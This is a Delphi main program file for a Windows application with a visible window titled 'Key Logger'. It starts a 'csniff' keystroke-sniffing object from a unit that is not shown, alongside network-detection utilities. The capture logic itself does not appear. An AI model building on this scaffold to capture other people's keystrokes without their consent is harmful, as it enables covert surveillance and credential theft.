
program uLogPr;

uses
  Messages,
  Windows,
  sysutils,
  uSniff in 'uSniff.pas',
  PathUtils in '..\sharedUtils\utils\PathUtils\PathUtils.pas',
  uPathMng in '..\sharedUtils\utils\uPathMng.pas',
  uGetAppPath in 'uGetAppPath.pas',
  XuNetUtil in '..\sharedUtils\компоненты\dcl_dpk\x-net\XuNetUtil.pas',
  XNetDetect_v2 in '..\sharedUtils\компоненты\dcl_dpk\x-net\XNetDetect_v2.pas',
  XuConnCheckThread in '..\sharedUtils\компоненты\dcl_dpk\x-net\XuConnCheckThread.pas';

//{$R *.res}
const
  WinTitle = 'snWnd';
  IconName='MAINICON';

var
  Handle: HWND;
  WinClass: TWndClass;
  Msg: TMsg;
  sniff:csniff;

function WndProc(hnd, wmsg, wparam, lparam: integer): integer; stdcall;
var
  t: string;
begin
  case wmsg of
  WM_COMMAND:
  begin

  end;
  WM_DESTROY:
    begin
      sniff.destroy;
      PostQuitMessage(0);
    end;
  else
    Result:=DefWindowProc(hnd, wmsg, wparam, lparam);
  end;
end;

Procedure CreateMySelf;
var
  T: string;
begin
  with WinClass do
    begin
      lpszClassName:=WinTitle;
      lpfnWndProc:=@WndProc;
      cbClsExtra:=0;
      cbWndExtra:=0;
      hInstance:=hInstance;
      style:=CS_HREDRAW+CS_VREDRAW+CS_DBLCLKS;
      hIcon:=LoadIcon(hInstance, IconName);
      hCursor:=LoadCursor(hInstance, IDC_ARROW);
      hbrBackground:=COLOR_WINDOW;
    end;
  RegisterClass(WinClass);
  Handle:=CreateWindowEx(WS_EX_WINDOWEDGE, WinTitle, 'Key Logger',
          WS_VISIBLE or WS_MINIMIZEBOX or WS_CAPTION or WS_SYSMENU,
          integer(CW_USEDEFAULT), integer(CW_USEDEFAULT),
          170, 63, 0, 0, hInstance, nil);
end;

procedure RegisterMySelf;
begin

end;

procedure StartSniff;
begin
  sniff:=csniff.create(handle);
  sniff.CheckSingletonApplication('AppMutex');
end;

begin
  CreateMySelf;
  RegisterMySelf;
  FindWindow(WinTitle, nil);
  StartSniff;
  while GetMessage(Msg, 0, 0, 0) do
  begin
    TranslateMessage(Msg);
    DispatchMessage(Msg);
  end;
end.
